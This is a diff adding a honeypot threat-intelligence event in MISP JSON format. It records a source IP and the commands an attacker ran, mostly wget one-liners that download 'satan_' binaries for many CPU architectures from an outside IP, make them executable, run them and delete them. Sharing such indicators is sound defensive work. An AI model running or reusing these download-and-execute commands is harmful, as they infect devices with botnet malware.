@@ -1,0 +1,171 @@
+{
+  "Event": {
+    "uuid": "c62b89fb-5918-5db0-8146-d0cd245cd8ef",
+    "info": "Sundew honeypot - campaign 94f106d21803 (1 sources) - enable",
+    "date": "2026-08-30",
+    "analysis": "2",
+    "threat_level_id": "3",
+    "published": true,
+    "Orgc": {
+      "name": "Sundew honeypot",
+      "uuid": "3d06790b-d81d-56fb-9e82-4e5ee6b6de3c"
+    },
+    "Tag": [
+      {
+        "name": "type:OSINT"
+      },
+      {
+        "name": "tlp:clear"
+      },
+      {
+        "name": "sundew:class=\"attack\""
+      }
+    ],
+    "Attribute": [
+      {
+        "uuid": "6f020d23-f546-59b0-a48a-e2396ed28c52",
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": true,
+        "value": "123.118.4.189",
+        "timestamp": "1788120012",
+        "comment": "delivered_payload, confidence high; 2 sessions, 30 commands, 2 downloads; first_seen 2026-08-27T08:30:07.157987Z, last_seen 2026-08-29T09:47:31.953900Z; expires 7d after last_seen"
+      },
+      {
+        "uuid": "2988643c-b92c-5bc6-85e0-c129543dffe9",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "enable",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "828a44f4-9b3e-5936-a66e-65773585edc8",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "system",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "8c6a4e0e-ed96-5c0f-a993-43bb36b8a215",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "RPMA",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "015e761a-4a81-5ded-ab61-45235a1922c8",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "AMOO",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "695181ac-4104-5c97-be45-c76b855181db",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.136/satan_mips; chmod 777 satan_mips; ./satan_mips; rm -rf satan_mips",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "b7919463-f9d6-5e03-90b9-3bcfd0fcda5c",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "wget http://176.65.139.136/satan_x86_64; chmod 777 satan_x86_64; ./satan_x86_64; rm -rf satan_x86_64",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "8fc7b1c6-077c-56ad-9869-e126b44b8c5e",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "wget http://176.65.139.136/satan_arm; chmod 777 satan_arm; ./satan_arm; rm -rf satan_arm",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "5fd2f261-9908-59df-b06e-246c1fa72b70",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "wget http://176.65.139.136/satan_mips_el; chmod 777 satan_mips_el; ./satan_mips_el; rm -rf satan_mips_el",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "29464bcf-d9bf-59fa-94a5-fe26b1f88456",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "wget http://176.65.139.136/satan_arm5; chmod 777 satan_arm5; ./satan_arm5; rm -rf satan_arm5",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "a6008a47-8435-5c4c-a9d5-5378f1cbad0b",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "wget http://176.65.139.136/satan_arm6; chmod 777 satan_arm6; ./satan_arm6; rm -rf satan_arm6",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "f7e365f0-98bb-52b9-8853-9b428535aab3",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "wget http://176.65.139.136/satan_arm7; chmod 777 satan_arm7; ./satan_arm7; rm -rf satan_arm7",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "365da5a9-a47e-56f0-82a5-f285a3f276e2",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "wget http://176.65.139.136/satan_ppc; chmod 777 satan_ppc; ./satan_ppc; rm -rf satan_ppc",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "b1e326ec-a21b-5c7f-b82c-20aa27169d21",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "wget http://176.65.139.136/satan_sparc; chmod 777 satan_sparc; ./satan_sparc; rm -rf satan_sparc",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "526eda73-ae2d-5705-9499-fb5dedd63e31",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "wget http://176.65.139.136/satan_m68k; chmod 777 satan_m68k; ./satan_m68k; rm -rf satan_m68k",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      },
+      {
+        "uuid": "ec542e56-a072-5d9c-a908-35367ae48f38",
+        "type": "text",
+        "category": "Artifacts dropped",
+        "to_ids": false,
+        "value": "wget http://176.65.139.136/satan_sh4; chmod 777 satan_sh4; ./satan_sh4; rm -rf satan_sh4",
+        "timestamp": "1788120012",
+        "comment": "command run by this campaign"
+      }
+    ]
+  }
+}
